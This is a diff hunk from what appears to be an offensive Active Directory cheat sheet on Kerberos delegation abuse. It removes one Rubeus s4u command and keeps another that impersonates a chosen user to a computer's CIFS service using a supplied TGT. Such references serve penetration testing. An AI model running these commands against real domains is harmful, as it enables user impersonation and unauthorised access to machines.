@@ -1967,7 +1967,6 @@ Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccount
 - Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right.
 - Make sure they are local admin on the target machine.
 ```
-.\Rubeus.exe s4u /user:<COMPUTERNAME>$ /msdsspn:cifs/<COMPUTER FQDN> /impersonateuser:<USER TO IMPERSONATE> /ticket:<TGT BASE64> /nowrap
 .\Rubeus.exe s4u /impersonateuser:<USER> /self /altservice:cifs/<COMPUTER FQDN> /user:<COMPUTERNAME>$ /ticket:<TGT TICKET> /nowrap
 ```
 
